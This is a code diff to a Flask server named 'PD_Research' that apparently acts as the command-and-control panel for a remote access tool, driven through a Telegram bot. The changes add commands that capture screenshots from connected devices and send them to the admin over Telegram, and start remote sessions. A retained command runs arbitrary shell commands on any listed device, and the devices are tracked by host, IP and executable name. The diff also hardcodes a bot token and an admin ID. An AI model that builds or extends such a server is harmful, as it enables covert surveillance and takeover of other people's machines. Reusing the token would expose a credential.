@@ -12,7 +12,6 @@ BOT_TOKEN = "8370598742:AAGtfxRT9rVDOThRavBnq_dFJFSXyHocK1s"  # REPLACE with you
 ADMIN_ID = 6586114356       # REPLACE with your numeric user ID
 # =================================================
 
-# Data storage
 devices = {}
 device_lock = threading.Lock()
 DATA_FILE = "devices_data.json"
@@ -35,6 +34,16 @@ def send_telegram_message(chat_id, message):
         requests.post(url, json=data, timeout=5)
     except:
         pass
+
+def send_telegram_photo(chat_id, photo_path):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    try:
+        with open(photo_path, 'rb') as f:
+            files = {'photo': f}
+            data = {'chat_id': chat_id}
+            requests.post(url, files=files, data=data, timeout=10)
+    except Exception as e:
+        send_telegram_message(chat_id, f"❌ Error sending screenshot: {str(e)}")
 
 load_devices()
 
@@ -91,13 +100,19 @@ def clear_command():
             save_devices()
     return jsonify({'status': 'cleared'})
 
-@app.route('/log', methods=['POST'])
-def receive_log():
-    data = request.json
-    device_id = data.get('device_id')
-    log_content = data.get('log')
-    logs[device_id] = log_content
-    return jsonify({'status': 'log received'})
+@app.route('/upload_screenshot', methods=['POST'])
+def upload_screenshot():
+    device_id = request.form.get('device_id')
+    file = request.files.get('file')
+    
+    if file and device_id:
+        temp_path = f"/tmp/screenshot_{device_id}.png"
+        file.save(temp_path)
+        send_telegram_photo(ADMIN_ID, temp_path)
+        send_telegram_message(ADMIN_ID, f"📸 Screenshot from <code>{device_id}</code>")
+        os.remove(temp_path)
+        return jsonify({'status': 'screenshot received'})
+    return jsonify({'status': 'error'}), 400
 
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
 def webhook():
@@ -111,10 +126,10 @@ def webhook():
             send_telegram_message(chat_id, "⛔ Unauthorized access denied.")
             return 'OK', 200
 
-        # --- COMMAND: /devices ---
+        # --- /devices ---
         if text == '/devices':
             if not devices:
-                send_telegram_message(chat_id, "📭 No devices are currently connected.")
+                send_telegram_message(chat_id, "📭 No devices connected.")
             else:
                 msg = "🖥️ <b>Connected Devices:</b>\n"
                 for idx, (device_id, info) in enumerate(devices.items(), 1):
@@ -125,7 +140,37 @@ def webhook():
                     msg += f"{idx}. <code>{device_id}</code> | {exe}.exe | {host} ({ip}) | {status}\n"
                 send_telegram_message(chat_id, msg)
 
-        # --- COMMAND: /cmd ---
+        # --- /screenshot ---
+        elif text.startswith('/screenshot'):
+            parts = text.split(' ', 1)
+            if len(parts) < 2:
+                send_telegram_message(chat_id, "⚠️ Usage: /screenshot DEVICE_ID")
+            else:
+                device_id = parts[1].strip()
+                with device_lock:
+                    if device_id in devices:
+                        devices[device_id]['pending_command'] = "SCREENSHOT"
+                        save_devices()
+                        send_telegram_message(chat_id, f"📸 Screenshot requested from <code>{device_id}</code>")
+                    else:
+                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
+
+        # --- /remote ---
+        elif text.startswith('/remote'):
+            parts = text.split(' ', 1)
+            if len(parts) < 2:
+                send_telegram_message(chat_id, "⚠️ Usage: /remote DEVICE_ID")
+            else:
+                device_id = parts[1].strip()
+                with device_lock:
+                    if device_id in devices:
+                        devices[device_id]['pending_command'] = "REMOTE"
+                        save_devices()
+                        send_telegram_message(chat_id, f"🔗 Remote session requested for <code>{device_id}</code>")
+                    else:
+                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
+
+        # --- /cmd ---
         elif text.startswith('/cmd'):
             parts = text.split(' ', 2)
             if len(parts) < 3:
@@ -137,37 +182,11 @@ def webhook():
                     if device_id in devices:
                         devices[device_id]['pending_command'] = f"CMD:{command}"
                         save_devices()
-                        send_telegram_message(chat_id, f"⌨️ Command <code>{command}</code> sent to <code>{device_id}</code>.")
+                        send_telegram_message(chat_id, f"⌨️ Command sent to <code>{device_id}</code>")
                     else:
                         send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
 
-        # --- COMMAND: /fetchlog ---
-        elif text.startswith('/fetchlog'):
-            parts = text.split(' ', 1)
-            if len(parts) < 2:
-                send_telegram_message(chat_id, "⚠️ Usage: /fetchlog DEVICE_ID")
-            else:
-                device_id = parts[1].strip()
-                with device_lock:
-                    if device_id in devices:
-                        devices[device_id]['pending_command'] = "FETCH_LOG"
-                        save_devices()
-                        send_telegram_message(chat_id, f"📋 Fetching log from <code>{device_id}</code>. Please wait...")
-                        time.sleep(5)
-                        if device_id in logs and logs[device_id]:
-                            log_content = logs[device_id]
-                            if len(log_content) > 4000:
-                                chunks = [log_content[i:i+4000] for i in range(0, len(log_content), 4000)]
-                                for i, chunk in enumerate(chunks, 1):
-                                    send_telegram_message(chat_id, f"📄 Log part {i}/{len(chunks)}:\n<pre>{chunk}</pre>")
-                            else:
-                                send_telegram_message(chat_id, f"📄 Log from <code>{device_id}</code>:\n<pre>{log_content}</pre>")
-                        else:
-                            send_telegram_message(chat_id, f"⏳ No log received yet from <code>{device_id}</code>. Try again in a few moments.")
-                    else:
-                        send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
-
-        # --- COMMAND: /disconnect ---
+        # --- /disconnect ---
         elif text.startswith('/disconnect'):
             parts = text.split(' ', 1)
             if len(parts) < 2:
@@ -178,32 +197,25 @@ def webhook():
                     if device_id in devices:
                         devices[device_id]['pending_command'] = "CMD:pdagent stop"
                         save_devices()
-                        send_telegram_message(chat_id, f"🔌 Disconnecting <code>{device_id}</code>. Device will be free for next user.")
+                        send_telegram_message(chat_id, f"🔌 Disconnecting <code>{device_id}</code>")
                     else:
                         send_telegram_message(chat_id, f"❌ Device <code>{device_id}</code> not found.")
 
-        # --- COMMAND: /help ---
+        # --- /help ---
         elif text == '/help':
             help_msg = (
                 "🤖 <b>Available Commands:</b>\n\n"
                 "/devices - List all connected devices\n"
-                "/cmd DEVICE_ID \"command\" - Run any command on device\n"
-                "/fetchlog DEVICE_ID - Get debug log from device\n"
-                "/disconnect DEVICE_ID - Disconnect device (free it for next user)\n"
-                "/help - Show this menu\n\n"
-                "<b>Built-in daemon commands:</b>\n"
-                "Send these directly to the device's Telegram group:\n"
-                "/screenshot - Capture the display\n"
-                "/remote - Start remote session\n"
-                "/hotkey keys - Send keyboard shortcuts\n"
-                "/ls, /cd, /pwd - File system commands\n"
-                "/status - Check daemon status\n\n"
-                "For a complete list, visit the group where the device is connected."
+                "/screenshot DEVICE_ID - Take screenshot\n"
+                "/remote DEVICE_ID - Start remote session\n"
+                "/cmd DEVICE_ID \"command\" - Run any command\n"
+                "/disconnect DEVICE_ID - Disconnect device\n"
+                "/help - Show this menu"
             )
             send_telegram_message(chat_id, help_msg)
 
         else:
-            send_telegram_message(chat_id, f"❓ Unknown command. Type /help for available commands.")
+            send_telegram_message(chat_id, f"❓ Unknown command. Type /help")
 
     return 'OK', 200
 
@@ -216,7 +228,7 @@ def set_webhook():
 
 @app.route('/')
 def home():
-    return "✅ PD_Research Final Server is RUNNING and AWAKE!"
+    return "✅ PD_Research Server is RUNNING!"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
